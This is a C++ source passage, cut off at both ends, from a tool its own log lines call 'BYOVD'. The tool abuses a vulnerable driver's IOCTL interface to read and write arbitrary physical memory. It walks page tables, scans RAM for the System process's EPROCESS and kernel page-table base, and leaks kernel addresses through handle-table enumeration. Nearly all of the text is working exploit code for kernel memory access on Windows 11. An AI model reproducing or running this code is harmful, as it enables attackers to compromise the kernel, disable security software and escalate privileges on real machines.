                auto* h = reinterpret_cast<SIV_MAP_RW_INPUT*>(buf.data());
                h->PhysicalAddress = physAddr;
                h->Size = static_cast<UINT32>(size);
                h->Flags = SIV_FLAG_READBACK;
                ok = DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                    buf.data(), static_cast<DWORD>(size),
                    buf.data(), static_cast<DWORD>(size), &ret, nullptr);
                printf("[BYOVD]       Cmd14-B (in=out=%zu): ok=%d ret=%lu err=0x%lX\n",
                    size, ok, ret, GetLastError());
                if (ok && ret > 0) {
                    memcpy(buffer, buf.data(), size);
                    return true;
                }
            }

            // Variant C: input=header, output=header+size
            {
                SIV_MAP_RW_INPUT hdr{};
                hdr.PhysicalAddress = physAddr;
                hdr.Size = static_cast<UINT32>(size);
                hdr.Flags = SIV_FLAG_READBACK;
                std::vector<uint8_t> outBuf(sizeof(SIV_MAP_RW_INPUT) + size, 0);
                ok = DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                    &hdr, sizeof(hdr),
                    outBuf.data(), static_cast<DWORD>(outBuf.size()), &ret, nullptr);
                printf("[BYOVD]       Cmd14-C (in=16 out=%zu): ok=%d ret=%lu err=0x%lX\n",
                    outBuf.size(), ok, ret, GetLastError());
                if (ok && ret > 0) {
                    // Data could be at offset 0 or 0x10
                    if (ret > sizeof(SIV_MAP_RW_INPUT))
                        memcpy(buffer, outBuf.data() + sizeof(SIV_MAP_RW_INPUT),
                               min(size, (size_t)(ret - sizeof(SIV_MAP_RW_INPUT))));
                    else
                        memcpy(buffer, outBuf.data(), min(size, (size_t)ret));
                    return true;
                }
            }

            // Variant D: Try Cmd 0x13 (MDL-based bulk read)
            {
                SIV_MAP_RW_INPUT hdr{};
                hdr.PhysicalAddress = physAddr;
                hdr.Size = static_cast<UINT32>(size);
                hdr.Flags = SIV_FLAG_READBACK;
                ok = DeviceIoControl(m_hDevice, SIV_CMD_READ_PHYS_BULK,
                    &hdr, sizeof(hdr),
                    buffer, static_cast<DWORD>(size), &ret, nullptr);
                printf("[BYOVD]       Cmd13 (MDL bulk): ok=%d ret=%lu err=0x%lX\n",
                    ok, ret, GetLastError());
                if (ok && ret > 0) { return true; }
            }

            return false;
        }

        // ---- Physical memory R/W via detected protocol ----

        bool ReadPhysical(uint64_t physAddr, void* buffer, size_t size)
        {
            if (!size || size > 0x40000) return false;

            // SAFETY: Reject reads from MMIO regions — MmMapIoSpace on device
            // registers WILL BSOD. Only allow reads within known RAM ranges.
            if (!IsPhysicalAddressSafe(physAddr, size))
            {
                memset(buffer, 0, size);
                return false;
            }

            SIV_MAP_RW_INPUT hdr{};
            hdr.PhysicalAddress = physAddr;
            hdr.Size            = static_cast<UINT32>(size);
            hdr.Padding         = 0;
            DWORD bytesReturned = 0;
            BOOL ok = FALSE;

            switch (m_protoMode)
            {
            case 1: // Standard: input=header, output=buffer
            default:
                hdr.Flags = SIV_FLAG_READBACK;
                ok = DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                    &hdr, sizeof(hdr),
                    buffer, static_cast<DWORD>(size),
                    &bytesReturned, nullptr);
                return ok && bytesReturned > 0;

            case 2: // Combined buffer, data at offset 0
            {
                std::vector<uint8_t> combined(sizeof(SIV_MAP_RW_INPUT) + size);
                memcpy(combined.data(), &hdr, sizeof(hdr));
                auto* h = reinterpret_cast<SIV_MAP_RW_INPUT*>(combined.data());
                h->Flags = SIV_FLAG_READBACK;
                ok = DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                    combined.data(), static_cast<DWORD>(combined.size()),
                    combined.data(), static_cast<DWORD>(combined.size()),
                    &bytesReturned, nullptr);
                if (ok && bytesReturned > 0)
                {
                    memcpy(buffer, combined.data(), min(size, (size_t)bytesReturned));
                    return true;
                }
                return false;
            }

            case 3: // Combined buffer, data at offset 0x10
            {
                std::vector<uint8_t> combined(sizeof(SIV_MAP_RW_INPUT) + size);
                memcpy(combined.data(), &hdr, sizeof(hdr));
                auto* h = reinterpret_cast<SIV_MAP_RW_INPUT*>(combined.data());
                h->Flags = SIV_FLAG_READBACK;
                ok = DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                    combined.data(), static_cast<DWORD>(combined.size()),
                    combined.data(), static_cast<DWORD>(combined.size()),
                    &bytesReturned, nullptr);
                if (ok && bytesReturned > sizeof(SIV_MAP_RW_INPUT))
                {
                    memcpy(buffer, combined.data() + sizeof(SIV_MAP_RW_INPUT),
                           min(size, (size_t)(bytesReturned - sizeof(SIV_MAP_RW_INPUT))));
                    return true;
                }
                return false;
            }

            case 4: // Cmd 0x10 scatter-gather
                hdr.Flags = SIV_FLAG_READBACK;
                ok = DeviceIoControl(m_hDevice, SIV_CMD_READ_PHYS,
                    &hdr, sizeof(hdr),
                    buffer, static_cast<DWORD>(size),
                    &bytesReturned, nullptr);
                return ok && bytesReturned > 0;

            case 5: // Cmd 0x14 with flags=write|readback
                hdr.Flags = SIV_FLAG_WRITE | SIV_FLAG_READBACK;
                ok = DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                    &hdr, sizeof(hdr),
                    buffer, static_cast<DWORD>(size),
                    &bytesReturned, nullptr);
                return ok && bytesReturned > 0;

            case 6: // CTL_CODE format
            {
                constexpr DWORD ctlCode = (0x22 << 16) | (0 << 14) | (0x14 << 2) | 0;
                hdr.Flags = SIV_FLAG_READBACK;
                ok = DeviceIoControl(m_hDevice, ctlCode,
                    &hdr, sizeof(hdr),
                    buffer, static_cast<DWORD>(size),
                    &bytesReturned, nullptr);
                return ok && bytesReturned > 0;
            }

            case 7: // Scatter-gather cmd 0x14 (MmMapIoSpace, full physical range)
            {
                // Offset is BYTE-based. DwordCount>1 is broken (only first 4 bytes returned).
                // So we read exactly 4 bytes per IOCTL, at the exact byte offset.
                auto* dst = static_cast<uint8_t*>(buffer);
                uint64_t addr = physAddr;
                size_t remaining = size;
                while (remaining > 0)
                {
                    uint32_t pageOff = static_cast<uint32_t>(addr & 0xFFF);
                    size_t pageLeft = 0x1000 - pageOff;
                    size_t chunk = min(remaining, min((size_t)4, pageLeft));

                    SIV_MAP_RW_SCATTER scatter{};
                    scatter.Header.PhysicalAddress = addr & ~0xFFFULL;
                    scatter.Header.MapSize         = 0x1000;
                    scatter.Header.Flags           = 0;
                    scatter.Header.EntryCount      = 1;
                    scatter.Entry.Offset           = pageOff;
                    scatter.Entry.DwordCount       = 1;

                    DWORD ret = 0;
                    if (!DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                        &scatter, sizeof(scatter),
                        &scatter, sizeof(scatter),
                        &ret, nullptr) || ret == 0)
                        return false;
                    m_ioctlCount++;

                    memcpy(dst, scatter.Entry.Data, chunk);
                    dst += chunk;
                    addr += chunk;
                    remaining -= chunk;
                }
                return true;
            }
            }
        }

        bool WritePhysical(uint64_t physAddr, const void* buffer, size_t size)
        {
            if (!size || size > 0x40000) return false;

            // SAFETY: Reject writes to MMIO regions
            if (!IsPhysicalAddressSafe(physAddr, size))
                return false;

            if (m_protoMode == 7)
            {
                // Scatter-gather write: 4 bytes per entry (DwordCount>1 broken).
                // Offset is byte-based.
                auto* src = static_cast<const uint8_t*>(buffer);
                uint64_t addr = physAddr;
                size_t remaining = size;
                while (remaining > 0)
                {
                    uint32_t pageOff = static_cast<uint32_t>(addr & 0xFFF);
                    size_t pageLeft = 0x1000 - pageOff;
                    size_t chunk = min(remaining, min((size_t)4, pageLeft));

                    SIV_MAP_RW_SCATTER scatter{};
                    scatter.Header.PhysicalAddress = addr & ~0xFFFULL;
                    scatter.Header.MapSize         = 0x1000;
                    scatter.Header.Flags           = SIV_FLAG_WRITE;
                    scatter.Header.EntryCount      = 1;
                    scatter.Entry.Offset           = pageOff;
                    scatter.Entry.DwordCount       = 1;
                    memcpy(scatter.Entry.Data, src, chunk);

                    DWORD ret = 0;
                    if (!DeviceIoControl(m_hDevice, SIV_CMD_MAP_RW,
                        &scatter, sizeof(scatter),
                        &scatter, sizeof(scatter),
                        &ret, nullptr))
                        return false;

                    src += chunk;
                    addr += chunk;
                    remaining -= chunk;
                }
                return true;
            }

            // Build input: [header 0x10] + [write data]
            size_t inputSize = sizeof(SIV_MAP_RW_INPUT) + size;
            std::vector<uint8_t> inputBuf(inputSize);

            auto* hdr = reinterpret_cast<SIV_MAP_RW_INPUT*>(inputBuf.data());
            hdr->PhysicalAddress = physAddr;
            hdr->Size            = static_cast<UINT32>(size);
            hdr->Padding         = 0;
            hdr->Flags           = SIV_FLAG_WRITE;
            memcpy(inputBuf.data() + sizeof(SIV_MAP_RW_INPUT), buffer, size);

            DWORD bytesReturned = 0;
            DWORD cmd = (m_protoMode == 6)
                ? (DWORD)((0x22 << 16) | (0 << 14) | (0x14 << 2) | 0)
                : SIV_CMD_MAP_RW;
            return DeviceIoControl(m_hDevice, cmd,
                inputBuf.data(), static_cast<DWORD>(inputSize),
                nullptr, 0,
                &bytesReturned, nullptr) != 0;
        }

        // ---- Page table walking (VA → PA) ----

        uint64_t TranslateVA(uint64_t dtb, uint64_t va)
        {
            uint64_t pml4Idx = (va >> 39) & 0x1FF;
            uint64_t pdptIdx = (va >> 30) & 0x1FF;
            uint64_t pdIdx   = (va >> 21) & 0x1FF;
            uint64_t ptIdx   = (va >> 12) & 0x1FF;
            uint64_t offset  = va & 0xFFF;

            uint64_t pml4e = 0;
            if (!ReadPhysical((dtb & ~0xFFFULL) + pml4Idx * 8, &pml4e, 8)
                || !(pml4e & SIVPage::PRESENT))
                return 0;

            uint64_t pdpte = 0;
            if (!ReadPhysical((pml4e & SIVPage::PFN_MASK) + pdptIdx * 8, &pdpte, 8)
                || !(pdpte & SIVPage::PRESENT))
                return 0;
            if (pdpte & SIVPage::LARGE)
                return (pdpte & 0x000FFFFFC0000000ULL) + (va & (SIVPage::SIZE_1GB - 1));

            uint64_t pde = 0;
            if (!ReadPhysical((pdpte & SIVPage::PFN_MASK) + pdIdx * 8, &pde, 8)
                || !(pde & SIVPage::PRESENT))
                return 0;
            if (pde & SIVPage::LARGE)
                return (pde & 0x000FFFFFFFE00000ULL) + (va & (SIVPage::SIZE_2MB - 1));

            uint64_t pte = 0;
            if (!ReadPhysical((pde & SIVPage::PFN_MASK) + ptIdx * 8, &pte, 8)
                || !(pte & SIVPage::PRESENT))
                return 0;

            return (pte & SIVPage::PFN_MASK) + offset;
        }

        // ---- System DTB discovery ----
        // Scan low 1MB of physical memory for processor startup block

        bool FindSystemDTB()
        {
            auto* lowStub = new(std::nothrow) uint8_t[0x100000];
            if (!lowStub) return false;

            int readOk = 0, readFail = 0;
            for (uint32_t off = 0; off < 0x100000; off += 0x1000)
            {
                if (!ReadPhysical(off, lowStub + off, 0x1000))
                {
                    memset(lowStub + off, 0, 0x1000);
                    readFail++;
                }
                else readOk++;
            }
            printf("[BYOVD] Low 1MB: %d pages read OK, %d failed\n", readOk, readFail);

            bool found = false;
            int sigMatches = 0, kvaPass = 0, pml4Pass = 0;
            for (uint32_t off = 0x1000; off < 0x100000; off += 0x1000)
            {
                uint64_t sig = *reinterpret_cast<uint64_t*>(lowStub + off);
                if ((sig & SIVPSB::SIG_MASK) != SIVPSB::SIG_VALUE)
                    continue;
                sigMatches++;
                printf("[BYOVD]   Sig match at 0x%X: 0x%016llX\n", off, sig);

                uint64_t kernEntry = *reinterpret_cast<uint64_t*>(lowStub + off + 0x70);
                printf("[BYOVD]     KernEntry(+0x70)=0x%016llX\n", kernEntry);
                if ((kernEntry & SIVPSB::KVA_MASK) != SIVPSB::KVA_EXPECT)
                    continue;
                kvaPass++;

                uint64_t pml4 = *reinterpret_cast<uint64_t*>(lowStub + off + 0xA0);
                printf("[BYOVD]     PML4(+0xA0)=0x%016llX\n", pml4);
                if (pml4 & SIVPSB::PML4_BAD || pml4 == 0 || pml4 > 0x100000000ULL)
                {
                    printf("[BYOVD]     PML4 rejected (bad bits or range)\n");
                    continue;
                }
                pml4Pass++;

                // Probe: try tiny reads at the PML4 address to diagnose
                uint64_t probe8 = 0;
                bool probe8ok = ReadPhysical(pml4, &probe8, 8);
                printf("[BYOVD]     Probe 8B at 0x%llX: ok=%d val=0x%016llX\n", pml4, probe8ok, probe8);

                // Try reading above 1MB with various sizes
                uint64_t probeHigh = 0;
                bool highOk = ReadPhysical(0x100000, &probeHigh, 8);
                printf("[BYOVD]     Probe 8B at 0x100000: ok=%d\n", highOk);

                // Validate the PML4 page — try full read first
                uint64_t pml4Page[512] = {};
                bool pageOk = ReadPhysical(pml4, pml4Page, sizeof(pml4Page));

                // If full page read fails, try chunked (8 bytes at a time)
                if (!pageOk)
                {
                    printf("[BYOVD]     Full page read failed, trying chunked...\n");
                    bool anyChunkOk = false;
                    int chunkOk = 0, chunkFail = 0;
                    for (int i = 0; i < 512; i++)
                    {
                        if (ReadPhysical(pml4 + i * 8, &pml4Page[i], 8))
                        {
                            chunkOk++;
                            anyChunkOk = true;
                        }
                        else chunkFail++;
                    }
                    printf("[BYOVD]     Chunked: %d OK, %d fail\n", chunkOk, chunkFail);
                    pageOk = anyChunkOk;
                }

                // If still nothing, try Cmd 0x14 with various buffer layouts
                if (!pageOk)
                {
                    printf("[BYOVD]     Trying Cmd 0x14 variants for PML4 page...\n");
                    pageOk = ReadPhysicalCmd14(pml4, pml4Page, sizeof(pml4Page));
                }

                if (pageOk)
                {
                    uint32_t valid = 0, kernel = 0;
                    for (int i = 0; i < 512; i++)
                    {
                        if (!(pml4Page[i] & SIVPage::PRESENT)) continue;
                        uint64_t pfn = pml4Page[i] & SIVPage::PFN_MASK;
                        if (pfn >= 0x8000000000ULL) continue;
                        valid++;
                        if (i >= 256) kernel++;
                    }
                    printf("[BYOVD]     PML4 page: %u valid, %u kernel entries\n", valid, kernel);
                    // Print first few entries for debugging
                    for (int i = 0; i < 4; i++)
                        printf("[BYOVD]       [%d]=0x%016llX\n", i, pml4Page[i]);
                    for (int i = 256; i < 260; i++)
                        printf("[BYOVD]       [%d]=0x%016llX\n", i, pml4Page[i]);

                    if (valid > 0 && kernel > 0)
                    {
                        m_systemDTB = pml4;
                        printf("[BYOVD]   *** System DTB = 0x%llX ***\n", pml4);
                        found = true;
                        break;
                    }
                }
                else
                {
                    printf("[BYOVD]     All PML4 page read methods failed\n");
                }
            }

            if (!found)
                printf("[BYOVD] DTB scan: %d sig, %d kva, %d pml4 candidates — none validated\n",
                    sigMatches, kvaPass, pml4Pass);

            delete[] lowStub;

            // Log Windows build for offset selection diagnostics
            {
                char buildStr[32] = {};
                DWORD strSz = sizeof(buildStr), type = 0;
                HKEY hVerKey = nullptr;
                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                    0, KEY_READ, &hVerKey) == ERROR_SUCCESS)
                {
                    RegQueryValueExA(hVerKey, "CurrentBuildNumber", nullptr, &type,
                        (LPBYTE)buildStr, &strSz);
                    RegCloseKey(hVerKey);
                }
                printf("[BYOVD] Windows build: %s\n", buildStr[0] ? buildStr : "unknown");
                fflush(stdout);
            }

            // Get EPROCESS VA early — needed for both brute-force and targeted scans
            uint64_t eprocVA = GetSystemEprocessVA();

            // ---- Fallback 1: brute-force DTB via ntoskrnl VA (fastest if 1GB pages used) ----
            if (!found)
            {
                printf("[BYOVD] Fallback1: brute-force DTB via ntoskrnl (IOCTLs: %llu)...\n", m_ioctlCount);
                fflush(stdout);
                found = FindSystemDTB_BruteForce(eprocVA);
            }

            // ---- Fallback 2: NtQSI handle table → targeted scan (covers all RAM) ----
            if (!found)
            {
                printf("[BYOVD] Fallback2: NtQSI targeted scan (IOCTLs: %llu)...\n", m_ioctlCount);
                fflush(stdout);
                if (eprocVA)
                    found = FindSystemDTB_Targeted(eprocVA);
            }

            // ---- Fallback 3: EPROCESS scan (large range, uses safe RAM guards) ----
            if (!found)
            {
                printf("[BYOVD] Fallback3: EPROCESS scan (IOCTLs: %llu)...\n", m_ioctlCount);
                fflush(stdout);
                found = FindSystemDTB_EPROCESS();
            }

            if (!found)
                printf("[BYOVD] ALL DTB methods failed after %llu IOCTLs\n", m_ioctlCount);

            return found;
        }

        // Get the System EPROCESS kernel VA via NtQuerySystemInformation handle table
        uint64_t GetSystemEprocessVA()
        {
            typedef LONG NTSTATUS;
            typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
            auto NtQSI = (pNtQuerySystemInformation)GetProcAddress(
                GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
            if (!NtQSI) return 0;

            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, 4);
            if (!hProc) {
                printf("[BYOVD] OpenProcess(PID 4) failed: 0x%lX\n", GetLastError());
                return 0;
            }

            DWORD myPid = GetCurrentProcessId();
            ULONG_PTR myHandle = (ULONG_PTR)hProc;

            // SystemExtendedHandleInformation = 64
            struct HANDLE_ENTRY_EX {
                PVOID Object;
                ULONG_PTR UniqueProcessId;
                ULONG_PTR HandleValue;
                ULONG GrantedAccess;
                USHORT CreatorBackTraceIndex;
                USHORT ObjectTypeIndex;
                ULONG HandleAttributes;
                ULONG Reserved;
            };
            struct HANDLE_INFO_EX {
                ULONG_PTR NumberOfHandles;
                ULONG_PTR Reserved;
                HANDLE_ENTRY_EX Handles[1];
            };

            uint64_t result = 0;
            ULONG bufSize = 4 * 1024 * 1024;

            for (int retry = 0; retry < 10; retry++)
            {
                auto* buf = (uint8_t*)VirtualAlloc(nullptr, bufSize,
                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (!buf) break;

                ULONG retLen = 0;
                NTSTATUS status = NtQSI(64, buf, bufSize, &retLen);

                if (status == (NTSTATUS)0xC0000004L) { // STATUS_INFO_LENGTH_MISMATCH
                    VirtualFree(buf, 0, MEM_RELEASE);
                    bufSize = retLen + 0x10000;
                    continue;
                }

                if (status >= 0)
                {
                    auto* info = (HANDLE_INFO_EX*)buf;
                    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++)
                    {
                        auto& h = info->Handles[i];
                        if (h.UniqueProcessId == myPid && h.HandleValue == myHandle)
                        {
                            result = (uint64_t)h.Object;
                            break;
                        }
                    }
                }

                VirtualFree(buf, 0, MEM_RELEASE);
                break;
            }

            CloseHandle(hProc);

            if (result)
                printf("[BYOVD] System EPROCESS VA: 0x%llX (page offset: 0x%llX)\n",
                    result, result & 0xFFF);
            else
                printf("[BYOVD] Could not get System EPROCESS VA from handle table\n");
            return result;
        }

        // Targeted physical scan using known EPROCESS page offset from handle table
        bool FindSystemDTB_Targeted(uint64_t eprocessVA)
        {
            // Multiple offset sets to try — covers Win11 21H2 through 26H2+
            struct OffsetSet {
                uint32_t pid;   // EPROCESS offset of UniqueProcessId
                uint32_t name;  // EPROCESS offset of ImageFileName
                uint32_t dtb;   // KPROCESS offset of DirectoryTableBase
            };
            // The PID-to-Name delta (name - pid) is the key relationship.
            // DTB is always at KPROCESS+0x028 (extremely stable).
            // Common offsets across Win11 builds:
            OffsetSet offsets[] = {
                { 0x4C0, 0x614, 0x028 },  // Win11 26200+ (confirmed Name=0x614)
                { 0x480, 0x5D0, 0x028 },  // Win11 25H2 variant
                { 0x440, 0x5A8, 0x028 },  // Win11 21H2-24H2 (build 22000-26100)
                { 0x440, 0x5B0, 0x028 },  // Possible shift (+8 name)
                { 0x448, 0x5B0, 0x028 },  // Possible shift (+8 both)
                { 0x448, 0x5B8, 0x028 },  // Possible shift (+8 pid, +16 name)
                { 0x440, 0x5E8, 0x028 },  // Larger shift name (+0x40)
                { 0x480, 0x5E8, 0x028 },  // Both shifted significantly
                { 0x440, 0x5C0, 0x028 },  // +0x18 name
                { 0x448, 0x5E8, 0x028 },  // +8 pid, +0x40 name
            };
            constexpr int NUM_OFFSETS = sizeof(offsets) / sizeof(offsets[0]);

            uint32_t eprocPageOff = (uint32_t)(eprocessVA & 0xFFF);
            printf("[BYOVD] EPROCESS page offset: 0x%X, trying %d offset sets\n", eprocPageOff, NUM_OFFSETS);
            fflush(stdout);

            // Get ntoskrnl VA for DTB validation
            LPVOID ntDrivers[1];
            DWORD ntNeeded = 0;
            uint64_t ntBase = 0;
            if (EnumDeviceDrivers(ntDrivers, sizeof(ntDrivers), &ntNeeded) && ntNeeded > 0)
                ntBase = (uint64_t)ntDrivers[0];

            // Determine scan range: cover ALL physical RAM
            uint64_t maxScan = 0x100000000ULL; // default 4 GB
            if (!m_ramRanges.empty())
                maxScan = m_ramRanges.back().end;
            printf("[BYOVD] Targeted scan range: 0 - 0x%llX (%llu GB)\n", maxScan, maxScan >> 30);
            fflush(stdout);

            // Try each offset set
            for (int oi = 0; oi < NUM_OFFSETS; oi++)
            {
                auto& os = offsets[oi];
                uint32_t pidPageOff  = (eprocPageOff + os.pid) & 0xFFF;
                uint32_t namePageOff = (eprocPageOff + os.name) & 0xFFF;
                uint32_t dtbPageOff  = (eprocPageOff + os.dtb) & 0xFFF;

                bool pidSamePage  = (eprocPageOff + os.pid + 8 <= 0x1000);
                bool nameSamePage = (eprocPageOff + os.name + 15 <= 0x1000);

                if (!pidSamePage || !nameSamePage) continue;

                printf("[BYOVD]   OffsetSet[%d]: PID=0x%X Name=0x%X → pidPage=0x%X namePage=0x%X\n",
                    oi, os.pid, os.name, pidPageOff, namePageOff);
                fflush(stdout);

                int hits = 0;
                int nameHits = 0;

                for (uint64_t pa = 0; pa < maxScan; pa += 0x1000)
                {
                    uint64_t safe = NextSafeAddress(pa);
                    if (safe == UINT64_MAX) break;
                    if (safe > pa) { pa = safe & ~0xFFFULL; if (pa >= maxScan) break; }

                    if ((pa & 0x3FFFFFF) == 0 && pa > 0 && oi == 0)
                    {
                        printf("[BYOVD]   targeted: %llu MB / %llu MB (%d hits, %llu IOCTLs)\n",
                            pa >> 20, maxScan >> 20, hits, m_ioctlCount);
                        fflush(stdout);
                    }

                    // Fast PID check (4 bytes = 1 IOCTL)
                    uint32_t pidLow = 0;
                    if (!ReadPhysical(pa + pidPageOff, &pidLow, 4)) continue;
                    if (pidLow != 4) continue;

                    uint32_t pidHigh = 0;
                    ReadPhysical(pa + pidPageOff + 4, &pidHigh, 4);
                    if (pidHigh != 0) continue;

                    hits++;

                    // Check name
                    char name[16] = {};
                    if (!ReadPhysical(pa + namePageOff, name, 15)) continue;
                    name[15] = 0;

                    if (hits <= 5 && oi == 0)
                        printf("[BYOVD]     hit#%d PA=0x%llX name='%s'\n", hits, pa, name);

                    bool nameMatched = (strcmp(name, "System") == 0);
                    uint32_t discoveredNameOff = 0;

                    // Wide name search when fixed offset fails (first 2 offset sets)
                    if (!nameMatched && oi <= 1)
                    {
                        uint32_t wideStart = pidPageOff + 0x080;
                        uint32_t wideEnd = min(0xFF8U, pidPageOff + 0x350);
                        if (wideStart < 0x1000)
                        {
                            uint32_t wideLen = wideEnd - wideStart;
                            uint8_t wideBuf[0x300] = {};
                            if (wideLen > sizeof(wideBuf)) wideLen = sizeof(wideBuf);
                            bool wideOk = true;
                            for (uint32_t off = 0; off < wideLen; off += 4)
                                if (!ReadPhysical(pa + wideStart + off, wideBuf + off, 4))
                                { wideOk = false; break; }
                            if (wideOk)
                                for (uint32_t si = 0; si + 7 <= wideLen; si++)
                                    if (memcmp(wideBuf + si, "System\0", 7) == 0)
                                    { nameMatched = true; discoveredNameOff = (wideStart + si) - eprocPageOff; break; }
                        }
                    }

                    if (!nameMatched) continue;

                    nameHits++;
                    uint32_t actualNameOff = discoveredNameOff ? discoveredNameOff : os.name;
                    printf("[BYOVD]   *** Name match! PA=0x%llX PID=0x%X Name=0x%X%s\n",
                        pa, os.pid, actualNameOff, discoveredNameOff ? " (wide)" : "");

                    // Read KPROCESS header and try every 8-byte slot as potential DTB
                    uint64_t expectedPA = pa + eprocPageOff;
                    uint8_t kprocHdr[0x80] = {};
                    bool hdrOk = true;
                    for (uint32_t off = 0; off < 0x80; off += 4)
                        if (!ReadPhysical(pa + eprocPageOff + off, kprocHdr + off, 4))
                        { hdrOk = false; break; }

                    if (hdrOk)
                    {
                        for (int doff = 0; doff < 0x78; doff += 8)
                        {
                            uint64_t rawVal = *(uint64_t*)(kprocHdr + doff);
                            // Try standard mask and aggressive mask (strip upper metadata/VBS bits)
                            uint64_t masks[] = { ~0xFFFULL, 0x000FFFFFFFFFF000ULL };
                            for (uint64_t mask : masks)
                            {
                                uint64_t dtb = rawVal & mask;
                                if (dtb == 0 || dtb > maxScan) continue;

                                // VA round-trip validation (required)
                                uint64_t checkPA = TranslateVA(dtb, eprocessVA);
                                if (checkPA == expectedPA)
                                {
                                    m_systemDTB = dtb;
                                    printf("[BYOVD] *** System DTB: 0x%llX (VA-verified at KPROCESS+0x%X, raw=0x%llX, PID=0x%X Name=0x%X) ***\n",
                                        dtb, doff, rawVal, os.pid, actualNameOff);
                                    return true;
                                }

                                // MZ validation as fallback
                                if (ntBase)
                                {
                                    uint64_t ntPA = TranslateVA(dtb, ntBase);
                                    if (ntPA > 0 && ntPA < maxScan)
                                    {
                                        uint16_t magic = 0;
                                        if (ReadPhysical(ntPA, &magic, 2) && magic == 0x5A4D)
                                        {
                                            m_systemDTB = dtb;
                                            printf("[BYOVD] *** System DTB: 0x%llX (MZ-verified at KPROCESS+0x%X, raw=0x%llX, PID=0x%X Name=0x%X) ***\n",
                                                dtb, doff, rawVal, os.pid, actualNameOff);
                                            return true;
                                        }
                                    }
                                }
                            }
                        }

                        // No DTB validated — dump KPROCESS header for diagnostics
                        printf("[BYOVD]   KPROCESS dump at PA 0x%llX (no DTB validated):\n", expectedPA);
                        for (int off = 0; off < 0x80; off += 16)
                            printf("[BYOVD]     +%03X: %016llX %016llX\n", off,
                                *(uint64_t*)(kprocHdr + off), *(uint64_t*)(kprocHdr + off + 8));
                        fflush(stdout);
                    }
                }

                printf("[BYOVD]   OffsetSet[%d]: %d PID=4 hits, %d name matches in %llu GB\n",
                    oi, hits, nameHits, maxScan >> 30);
                fflush(stdout);
            }

            // Final fallback: for PID=4 pages found with first offset set,
            // do a full-page "System" string search
            printf("[BYOVD] Trying dynamic name search across all RAM...\n");
            fflush(stdout);
            {
                uint32_t pidOff0 = offsets[0].pid;
                uint32_t pidPageOff0 = (eprocPageOff + pidOff0) & 0xFFF;
                int dynamicHits = 0;

                for (uint64_t pa = 0; pa < maxScan; pa += 0x1000)
                {
                    uint64_t safe = NextSafeAddress(pa);
                    if (safe == UINT64_MAX) break;
                    if (safe > pa) { pa = safe & ~0xFFFULL; if (pa >= maxScan) break; }

                    if ((pa & 0x3FFFFFF) == 0 && pa > 0)
                    {
                        printf("[BYOVD]   dynamic: %llu MB / %llu MB (%d hits, %llu IOCTLs)\n",
                            pa >> 20, maxScan >> 20, dynamicHits, m_ioctlCount);
                        fflush(stdout);
                    }

                    // PID check at most likely candidate offsets
                    uint32_t pidCands[] = { 0x4C0, 0x440, 0x480, 0x448 };
                    for (auto pidCandidate : pidCands)
                    {
                        uint32_t pidPO = (eprocPageOff + pidCandidate) & 0xFFF;
                        if (pidPO + 8 > 0x1000) continue;

                        uint32_t pidLow = 0;
                        if (!ReadPhysical(pa + pidPO, &pidLow, 4)) continue;
                        if (pidLow != 4) continue;
                        uint32_t pidHigh = 0;
                        ReadPhysical(pa + pidPO + 4, &pidHigh, 4);
                        if (pidHigh != 0) continue;

                        dynamicHits++;

                        // Read a range where name could be and search for "System\0"
                        // Name is typically 0x080 to 0x350 bytes after PID (covers all known builds)
                        uint32_t searchStart = pidPO + 0x080;
                        uint32_t searchEnd = min(0xFFCU, pidPO + 0x350);
                        if (searchStart >= 0x1000) continue;
                        uint32_t searchLen = searchEnd - searchStart;

                        // Read the search region
                        uint8_t nameBuf[0x300];
                        if (searchLen > sizeof(nameBuf)) searchLen = sizeof(nameBuf);
                        if (!ReadPhysical(pa + searchStart, nameBuf, searchLen)) continue;

                        // Search for "System\0"
                        for (uint32_t si = 0; si + 7 <= searchLen; si++)
                        {
                            if (memcmp(nameBuf + si, "System\0", 7) == 0)
                            {
                                uint32_t foundNamePageOff = searchStart + si;
                                uint32_t nameOff = foundNamePageOff - eprocPageOff;
                                printf("[BYOVD]   *** Dynamic match! PA=0x%llX PID=0x%X Name=0x%X\n",
                                    pa, pidCandidate, nameOff);

                                // Try multiple DTB offsets (0x028 is standard, but try neighbors)
                                uint32_t dtbOffsets[] = { 0x028, 0x020, 0x030, 0x018, 0x038 };
                                for (uint32_t dtbOff : dtbOffsets)
                                {
                                    uint32_t dtbPO = (eprocPageOff + dtbOff) & 0xFFF;
                                    uint64_t dtb = 0;
                                    ReadPhysical(pa + dtbPO, &dtb, 8);
                                    uint64_t rawDtb = dtb;
                                    dtb &= ~0xFFFULL;

                                    printf("[BYOVD]   DTB at +0x%X: raw=0x%llX masked=0x%llX\n",
                                        dtbOff, rawDtb, dtb);

                                    if (dtb == 0) continue;
                                    // Accept any DTB within physical RAM range
                                    uint64_t maxPhys = m_ramRanges.empty() ? 0x800000000ULL : m_ramRanges.back().end;
                                    if (dtb > maxPhys) continue;

                                    // Validate: translate EPROCESS VA back, check it resolves to this PA
                                    if (eprocessVA)
                                    {
                                        uint64_t checkPA = TranslateVA(dtb, eprocessVA);
                                        uint64_t eprocExpectedPA = pa + eprocPageOff;
                                        if (checkPA == eprocExpectedPA)
                                        {
                                            m_systemDTB = dtb;
                                            printf("[BYOVD] *** System DTB: 0x%llX (dynamic+VA verify, PID=0x%X Name=0x%X) ***\n",
                                                dtb, pidCandidate, nameOff);
                                            return true;
                                        }
                                    }

                                    // Also try MZ validation
                                    if (ntBase)
                                    {
                                        uint64_t ntPA = TranslateVA(dtb, ntBase);
                                        if (ntPA > 0 && ntPA < 0x1000000000ULL)
                                        {
                                            uint16_t magic = 0;
